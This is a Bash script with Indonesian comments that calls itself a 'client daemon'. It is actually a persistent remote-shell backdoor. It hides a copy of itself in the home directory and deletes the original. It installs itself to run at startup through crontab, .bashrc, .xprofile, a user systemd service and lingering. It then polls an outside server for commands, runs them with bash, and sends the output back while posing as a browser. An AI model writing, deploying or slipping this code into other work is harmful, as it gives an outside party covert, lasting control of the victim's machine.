#!/usr/bin/env bash

# File log untuk memastikan script tidak diinstal ulang
INSTALL_LOG="$HOME/.client_daemon_installed"
SCRIPT_PATH="$(realpath "$0")"
SCRIPT_NAME="$(basename "$SCRIPT_PATH")"
PERMANENT_SCRIPT="$HOME/.client_daemon.sh" # Salinan permanen
LOG_FILE="$HOME/client_daemon.log"

# Jika script belum berjalan di bawah nohup
if [[ "$0" != "nohup" && -z "$NOHUP_RUNNING" ]]; then
    if [[ ! -f "$PERMANENT_SCRIPT" ]]; then
        echo "[INFO] Membuat salinan permanen script ke $PERMANENT_SCRIPT..."
        cp "$SCRIPT_PATH" "$PERMANENT_SCRIPT"
        chmod +x "$PERMANENT_SCRIPT"
    fi

    echo "[INFO] Menjalankan salinan permanen menggunakan nohup..."
    export NOHUP_RUNNING=1
    nohup bash "$PERMANENT_SCRIPT" > "$LOG_FILE" 2>&1 &
    echo "[INFO] Menghapus script asli..."
    rm -f "$SCRIPT_PATH"
    exit 0
fi

# Fungsi untuk menambahkan ke crontab
add_to_crontab() {
    echo "[INFO] Menambahkan salinan permanen script ke crontab..."
    (crontab -l 2>/dev/null; echo "@reboot nohup bash $PERMANENT_SCRIPT > $LOG_FILE 2>&1 &") | sort -u | crontab -
}

# Fungsi untuk menambahkan ke .bashrc
add_to_bashrc() {
    if ! grep -Fxq "nohup bash $PERMANENT_SCRIPT > $LOG_FILE 2>&1 &" "$HOME/.bashrc"; then
        echo "[INFO] Menambahkan salinan permanen script ke .bashrc..."
        echo "nohup bash $PERMANENT_SCRIPT > $LOG_FILE 2>&1 &" >> "$HOME/.bashrc"
    fi
}

# Fungsi untuk menambahkan ke .xprofile (untuk GUI Linux)
add_to_xprofile() {
    if ! grep -Fxq "nohup bash $PERMANENT_SCRIPT > $LOG_FILE 2>&1 &" "$HOME/.xprofile"; then
        echo "[INFO] Menambahkan salinan permanen script ke .xprofile..."
        echo "nohup bash $PERMANENT_SCRIPT > $LOG_FILE 2>&1 &" >> "$HOME/.xprofile"
    fi
}

# Fungsi untuk membuat systemd service
create_systemd_service() {
    SYSTEMD_USER_DIR="$HOME/.config/systemd/user"
    mkdir -p "$SYSTEMD_USER_DIR"
    SERVICE_FILE="$SYSTEMD_USER_DIR/client_daemon.service"

    if [[ ! -f "$SERVICE_FILE" ]]; then
        echo "[INFO] Membuat systemd service untuk script..."
        cat <<EOL >"$SERVICE_FILE"
[Unit]
Description=Client Daemon Service
After=network.target

[Service]
ExecStart=/usr/bin/bash $PERMANENT_SCRIPT
Restart=always
RestartSec=10
StandardOutput=append:$LOG_FILE
StandardError=append:$LOG_FILE

[Install]
WantedBy=default.target
EOL

        systemctl --user daemon-reload
        systemctl --user enable client_daemon.service
        systemctl --user start client_daemon.service
        echo "[INFO] Systemd service berhasil dibuat dan dijalankan."
    fi

    # Aktifkan layanan pengguna untuk memastikan tetap berjalan setelah logout
    loginctl enable-linger $(whoami)
}

# Jika script belum diinstal, lakukan instalasi
if [[ ! -f "$INSTALL_LOG" ]]; then
    echo "[INFO] Menginstal client daemon secara permanen..."
    add_to_crontab
    add_to_bashrc
    add_to_xprofile
    create_systemd_service

    echo "$(date): Script berhasil diinstal" > "$INSTALL_LOG"
    echo "[INFO] Script berhasil diinstal dan berjalan di latar belakang."
fi

# Jika sudah diinstal, jalankan fungsi utama
echo "[INFO] Script sudah diinstal, memulai proses utama..."

# Generate client ID dan secret
CLIENT_ID=$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | head -c 12)
SECRET=$(openssl rand -hex 8)

SERVER="https://rshell.saskra.com/"
echo "[INFO] Mendaftarkan client ke server dengan SECRET=$SECRET dan CLIENT_ID=$CLIENT_ID..."
curl -s -X POST -H "Content-Type: application/json" \
    -d "{\"secret\":\"$SECRET\", \"client_id\":\"$CLIENT_ID\"}" \
    "$SERVER/register_client.php"

while true; do
    cmd=$(curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
        -H "Cookie: cf_clearance=<cookie_value>" \
        -X POST -d "token=$SECRET" "$SERVER/get_command_and_post_result.php")

    if [[ "$cmd" == "NO_COMMAND" || -z "$cmd" ]]; then
        sleep 10
        continue
    fi

    echo "[INFO] Menjalankan perintah: $cmd"
    result=$(bash -c "$cmd" 2>&1)

    curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
        -H "Cookie: cf_clearance=<cookie_value>" \
        -X POST -d "token=$SECRET" --data-urlencode "result=$result" \
        "$SERVER/get_command_and_post_result.php" >/dev/null
    sleep 10
done
